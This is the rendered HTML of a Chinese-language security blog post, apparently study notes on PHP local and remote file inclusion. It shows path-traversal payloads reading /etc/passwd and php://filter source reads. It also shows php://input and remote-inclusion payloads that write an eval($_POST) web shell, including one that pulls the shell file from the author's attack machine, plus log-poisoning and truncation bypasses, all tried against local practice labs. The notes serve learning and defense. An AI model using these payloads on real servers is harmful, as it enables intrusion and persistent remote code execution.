@@ -1,0 +1,738 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="https://images.atsud0.me/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="https://images.atsud0.me/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="https://images.atsud0.me/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="https://images.atsud0.me/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"atsud0.me","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="学习文件包含的笔记。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件包含笔记">
+<meta property="og:url" content="http://atsud0.me/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/index.html">
+<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
+<meta property="og:description" content="学习文件包含的笔记。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200722_185510.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200722_185320.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200520_214305.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200520_214506.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200613_212318.jpg">
+<meta property="og:image" content="https://images.atsud0.me/images/post/Screenshot_20200615_172129.jpg">
+<meta property="article:published_time" content="2020-05-24T08:03:29.000Z">
+<meta property="article:modified_time" content="2021-02-23T15:38:50.456Z">
+<meta property="article:author" content="atsud0">
+<meta property="article:tag" content="LFI">
+<meta property="article:tag" content="RFI">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://images.atsud0.me/images/post/Screenshot_20200722_185510.jpg">
+
+<link rel="canonical" href="http://atsud0.me/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>文件包含笔记 | 雪之下二丁目鹤岗八幡宫</title>
+  
+    <script>
+      function sendPageView() {
+        if (CONFIG.hostname !== location.hostname) return;
+        var uid = localStorage.getItem('uid') || (Math.random() + '.' + Math.random());
+        localStorage.setItem('uid', uid);
+        navigator.sendBeacon('https://www.google-analytics.com/collect', new URLSearchParams({
+          v  : 1,
+          tid: 'UA-163969429-1',
+          cid: uid,
+          t  : 'pageview',
+          dp : encodeURIComponent(location.pathname)
+        }));
+      }
+      document.addEventListener('pjax:complete', sendPageView);
+      sendPageView();
+    </script>
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">雪之下二丁目鹤岗八幡宫</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/index.html" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">166</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">10</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">128</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://atsud0.me/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="https://images.atsud0.me/images/atsud0-avator.jpg">
+      <meta itemprop="name" content="atsud0">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="雪之下二丁目鹤岗八幡宫">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          文件包含笔记
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2020-05-24 16:03:29" itemprop="dateCreated datePublished" datetime="2020-05-24T16:03:29+08:00">2020-05-24</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-23 23:38:50" itemprop="dateModified" datetime="2021-02-23T23:38:50+08:00">2021-02-23</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Note/" itemprop="url" rel="index"><span itemprop="name">Note</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>1.8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>2 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>学习文件包含的笔记。</p>
+<a id="more"></a>
+
+<p>文件包含分为</p>
+<ul>
+<li>LFI本地文件包含</li>
+<li>RFI远程文件包含</li>
+</ul>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><p>LFI是本地文件包含漏洞，本地文件包含漏洞是指只能包含本机文件的文件包含漏洞，当Web应用程序未合理的包含一个文件时，存在此漏洞。攻击者可以控制输入注入路径遍历字符或服务器上其他文件进行攻击。<strong>文件包含不在意包含文件的后缀名，只要检测包含文件的内容中有php代码，就会以php方式解析执行。</strong>这也是能利用文件包含包含图片马的原因。</p>
+<p>LFI漏洞很容易识别，比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;tryhackme.com&#x2F;?file&#x3D;robots.txt</span><br></pre></td></tr></table></figure>
+
+<p>以及:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;lfi.php?file&#x3D;index.html</span><br></pre></td></tr></table></figure>
+
+<p>所以我们可以通过操作文件位置来利用，比如:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home?page&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home?page&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>以此来访问系统上的<code>/etc/passwd/</code>文件.</p>
+<p>漏洞的起因在于</p>
+<ul>
+<li>include()等函数通过动态变量的方式引入需要包含的文件，然后该变量能被用户控制。</li>
+</ul>
+<p>最简单的存在LFI漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$file=$_GET[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="RFI"><a href="#RFI" class="headerlink" title="RFI"></a>RFI</h3><p>RFI就是远程文件包含。<br>需要目标服务器打开<code>allow_url_include</code>配置，这个配置项是默认关闭的。</p>
+<h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><ol>
+<li>敏感信息泄露（相对路径&amp;绝对路径都可以</li>
+<li>获取webshell<ol>
+<li>直接一句话</li>
+<li>使用fwrite或fputs生成一句话</li>
+<li>日志文件中毒</li>
+</ol>
+</li>
+<li>任意命令执行</li>
+</ol>
+<h3 id="后端限制"><a href="#后端限制" class="headerlink" title="后端限制"></a>后端限制</h3><p>如果后端限制了包含文件的后缀名（自动给输入的变量加上一个后缀(.html或.php)什么的，这时可以使用00截断。</p>
+<h3 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h3><h4 id="file"><a href="#file" class="headerlink" title="file://"></a>file://</h4><p>用法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;[文件的绝对路径]</span><br></pre></td></tr></table></figure>
+<p>如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd</span><br><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;file:&#x2F;&#x2F;D:&#x2F;111.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h4><p>常用于读取文件/源码。<br>不用base64编码直接使用的时候，不能查看源码。用法如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;home.php?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;config.php 查看文件的源代码</span><br></pre></td></tr></table></figure>
+
+<h4 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h4><p>input会把post的代码当作php脚本来执行，所以要抓包post恶意php代码。</p>
+<p>抓包在post中输入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fwrite(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST[a])?&gt;'</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果能使用<code>php://input</code>伪协议，但是不能生成文件怎么直接用菜刀/蚁剑getshell?</p>
+<p>菜刀:<br>这办法只有菜刀能用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_185510.jpg" alt=""></p>
+<p>蚁剑:<br>这办法菜刀也能用。<br><img src="https://images.atsud0.me/images/post/Screenshot_20200722_185320.jpg" alt=""></p>
+<p>post的参数都可以丢到连接密码里。</p>
+<h4 id="zip伪协议"><a href="#zip伪协议" class="headerlink" title="zip伪协议"></a>zip伪协议</h4><p>zip伪协议<br>利用zip读取压缩包的文件,解压的压缩包后缀是什么没关系.<br>zip://绝对路径/压缩包文件名%23被压缩文件的文件名(%23是<code>#</code>)</p>
+<h4 id="伪协议总结"><a href="#伪协议总结" class="headerlink" title="伪协议总结"></a>伪协议总结</h4><table>
+<thead>
+<tr>
+<th>协议</th>
+<th>php版本</th>
+<th>allow_url_fopen</th>
+<th>allow_url_include</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>file://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?page=file:///etc/passwd</td>
+</tr>
+<tr>
+<td>php://filter</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?page=php://filter/read=convert.base64-encode/resource=./config.php</td>
+</tr>
+<tr>
+<td>php://input</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>on</td>
+<td>?page=php://input [post] <?php fwrite(fopen('shell.php','w'),'<?php eval($_POST[a])?>‘)?&gt;</td>
+</tr>
+<tr>
+<td>zip://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td>?page=zip:///var/www/html/upload/file.zip%23phpcode.txt</td>
+</tr>
+<tr>
+<td>bzip2://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td></td>
+</tr>
+<tr>
+<td>zlib://</td>
+<td>&gt;=5.2</td>
+<td>off/on</td>
+<td>off/on</td>
+<td></td>
+</tr>
+<tr>
+<td>data://</td>
+<td>&gt;=5.2</td>
+<td>on</td>
+<td>on</td>
+<td>?page=data://text/plain,<?php phpinfo()?></td>
+</tr>
+</tbody></table>
+<h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><h4 id="包含图片马"><a href="#包含图片马" class="headerlink" title="包含图片马"></a>包含图片马</h4><p>文件包含不在意包含的文件的后缀名字,只要检测到php代码则会以php方式解析</p>
+<h4 id="LFI日志文件中毒"><a href="#LFI日志文件中毒" class="headerlink" title="LFI日志文件中毒"></a>LFI日志文件中毒</h4><p>如果能访问目标系统的<code>apache</code>日志，那么我们可以考虑使用这个日志文件中毒的方式来执行系统命令，或插入一句话。<br>日志文件中毒要求对目录应该具有读和执行权限。<br>使用日志文件中毒执行系统命令<code>ls /var/www/html/lfi</code>命令，注意要使用url编码将空格和斜杠转义。</p>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200520_214305.jpg" alt="ls"></p>
+<p>插入一句话<br><img src="https://images.atsud0.me/images/post/Screenshot_20200520_214506.jpg" alt="yijuhua"></p>
+<h4 id="RFI包含生成一句话"><a href="#RFI包含生成一句话" class="headerlink" title="RFI包含生成一句话"></a>RFI包含生成一句话</h4><p>目标机器:192.168.40.133，存在远程包含文件漏洞（靶场pikachu<br>目标漏洞url：<code>http://192.168.40.133/pikachu/vul/fileinclude/fi_remote.php?filename=include%2Ffile2.php&amp;submit=Submit</code><br>利用方式：将<code>filename=include...</code>处修改为：<code>filename={攻击机器的url}/{生成一句话的文件的文本}</code><br>例如我的攻击机上面的文件为：newshell.php内容为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">'czxcshell.php'</span>,<span class="string">'a+'</span>),<span class="string">'&lt;?php eval($_POST[a])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>想让这个文件成功的被包含，那么就要将这这个<code>newshell.php</code>改名为<code>newshell.txt</code>再包含。最后构造的payload为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.133&#x2F;pikachu&#x2F;vul&#x2F;fileinclude&#x2F;fi_remote.php?filename&#x3D;http:&#x2F;&#x2F;192.168.40.123&#x2F;newshell.txt&amp;submit&#x3D;Submit</span><br></pre></td></tr></table></figure>
+<p>现在尝试访问该路径下的<code>czxshell.php</code><br><img src="https://images.atsud0.me/images/post/Screenshot_20200613_212318.jpg" alt=""><br>这里不改名也行，只要你的网站没有php环境就可以了。</p>
+<h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="限制特定字符"><a href="#限制特定字符" class="headerlink" title="限制特定字符"></a>限制特定字符</h4><p>如果限制了特定的文件字符的话,如<br><a href="http://127.0.0.1/?page=cat" target="_blank" rel="noopener">http://127.0.0.1/?page=cat</a><br>如果服务器限制了只能输入cat和dog的话.恰巧又有一个dogs的目录那就<br><a href="http://127.0.0.1/?page=./cats/../flag.txt" target="_blank" rel="noopener">http://127.0.0.1/?page=./cats/../flag.txt</a></p>
+<h4 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h4><p>00截断是利用了php的一个漏洞。漏洞编号为<code>CVE-2015-2348</code>。使用前提要求较为严格。</p>
+<ol>
+<li>服务器<code>php</code>版本小于<code>5.3</code></li>
+<li>魔术引号<code>gpc</code>处于关闭状态</li>
+<li>要求上传路径可控</li>
+</ol>
+<p>在url最后加入%00截断</p>
+<h4 id="截断"><a href="#截断" class="headerlink" title="./截断"></a>./截断</h4><p>利用多个英文句号(.)和反斜杆(/)来截断。不受GPC限制，但是在PHP5.3之后被修复</p>
+<h4 id="伪截断"><a href="#伪截断" class="headerlink" title="?伪截断"></a>?伪截断</h4><p>这个使用要求也是很严格的。要求可以远程文件包含，但是远程文件包含的配置项一般是默认关闭的。本地包含使用伪截断是不会成功的。</p>
+<p>文件代码：</p>
+<figure class="highlight php"><figcaption><span>VAuditDemo-index.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">/* Include */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'module'</span>]))&#123;</span><br><span class="line">		<span class="keyword">include</span>($_GET[<span class="string">'module'</span>].<span class="string">'.inc'</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;div class="jumbotron" style="text-align: center;"&gt;</span><br><span class="line">		&lt;h1&gt;&lt;b&gt;VAuditDemo&lt;/b&gt;&lt;/h1&gt;</span><br><span class="line">		&lt;p&gt;一个简单的Web漏洞演练平台&lt;/p&gt;&lt;br /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;div class="col-lg-12"&gt;</span><br><span class="line">		&lt;h2&gt;用於演示講解PHP基本漏洞&lt;/h2&gt;</span><br><span class="line">		&lt;p&gt;&lt;/p&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>构造的payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.40.123&#x2F;?module&#x3D;http:&#x2F;&#x2F;localhost&#x2F;yjh.php?</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/Screenshot_20200615_172129.jpg" alt=""></p>
+<blockquote>
+<p>都能远程包含了为什么还要伪截断..直接包含远程的inc文件不就好了吗…:(</p>
+</blockquote>
+<h3 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h3><ol>
+<li>设置白名单</li>
+<li>过滤危险字符</li>
+<li>关闭危险配置<ol>
+<li>allow_url_include=off</li>
+</ol>
+</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://www.jianshu.com/p/8803aff98bfa" title="" target="">LFI&#x2F;RFI初学者指南</a></li>
+<li><a href="https://github.com/cyberheartmi9/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal#basic-lfi-null-byte-double-encoding-and-other-tricks" target="_blank" rel="noopener">基础LFI查询</a></li>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion" target="_blank" rel="noopener">LFI</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>atsud0
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://atsud0.me/2020/05/24/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AC%94%E8%AE%B0/" title="文件包含笔记">http://atsud0.me/2020/05/24/文件包含笔记/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/LFI/" rel="tag"><i class="fa fa-tag"></i> LFI</a>
+              <a href="/tags/RFI/" rel="tag"><i class="fa fa-tag"></i> RFI</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="prev" title="文件上传漏洞学习笔记">
+      <i class="fa fa-chevron-left"></i> 文件上传漏洞学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/05/24/xss%E7%AC%94%E8%AE%B0/" rel="next" title="xss笔记">
+      xss笔记 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件包含"><span class="nav-number">1.</span> <span class="nav-text">文件包含</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#LFI"><span class="nav-number">1.1.</span> <span class="nav-text">LFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RFI"><span class="nav-number">1.2.</span> <span class="nav-text">RFI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞危害"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞危害</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#后端限制"><span class="nav-number">1.4.</span> <span class="nav-text">后端限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php伪协议"><span class="nav-number">1.5.</span> <span class="nav-text">php伪协议</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#file"><span class="nav-number">1.5.1.</span> <span class="nav-text">file:&#x2F;&#x2F;</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-filter"><span class="nav-number">1.5.2.</span> <span class="nav-text">php:&#x2F;&#x2F;filter</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-input"><span class="nav-number">1.5.3.</span> <span class="nav-text">php:&#x2F;&#x2F;input</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#zip伪协议"><span class="nav-number">1.5.4.</span> <span class="nav-text">zip伪协议</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#伪协议总结"><span class="nav-number">1.5.5.</span> <span class="nav-text">伪协议总结</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#获取webshell"><span class="nav-number">1.6.</span> <span class="nav-text">获取webshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#包含图片马"><span class="nav-number">1.6.1.</span> <span class="nav-text">包含图片马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#LFI日志文件中毒"><span class="nav-number">1.6.2.</span> <span class="nav-text">LFI日志文件中毒</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#RFI包含生成一句话"><span class="nav-number">1.6.3.</span> <span class="nav-text">RFI包含生成一句话</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过方式"><span class="nav-number">1.7.</span> <span class="nav-text">绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#限制特定字符"><span class="nav-number">1.7.1.</span> <span class="nav-text">限制特定字符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#00截断"><span class="nav-number">1.7.2.</span> <span class="nav-text">%00截断</span></a></li><li class="nav-item 